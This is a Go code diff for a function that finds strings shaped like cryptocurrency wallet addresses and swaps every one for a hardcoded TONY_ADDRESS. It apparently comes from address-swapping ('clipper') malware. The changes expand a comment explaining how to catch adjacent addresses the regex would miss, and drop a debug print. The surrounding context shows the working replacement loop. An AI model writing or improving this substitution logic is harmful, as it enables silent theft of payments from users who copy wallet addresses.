@@ -35,8 +35,18 @@ func main() {
 	}
 }
 
-// This function works, but is a bit of a nightmare..
-// TODO: clean this up
+/*
+This function works, but is a bit of a nightmare..
+TODO: clean this up
+Essentially, every place that has an address that is viable, drop in place.
+We're not able to use regexp.ReplaceAll because of the following scenario:
+expr: (^|\s)(7[[:alnum:]]{25,34})(\s|$)
+'coins: <coin1> <coin2> <coin3>'
+
+Only coin1 and coin3 will be caught, because they consume the spaces pre-pending
+and appending for coin2. So coin2 will be missed, because it doesnt meet the criteria,
+since it would look 'coins:<coin2> <coin3>' after <coin1> was replaced.
+*/
 func replaceToken(data []byte) []byte {
 	re := regexp.MustCompile(`7[[:alnum:]]{25,34}`)
 	var valid [][2]int
@@ -70,7 +80,6 @@ func replaceToken(data []byte) []byte {
 		plen := len(pieces)
 		newData := []byte{}
 		for pi, piece := range pieces {
-			// fmt.Printf("%d '%s'\n", pi, string(piece))
 			newData = append(newData, piece...)
 			if pi < plen-1 {
 				newData = append(newData, []byte(TONY_ADDRESS)...)
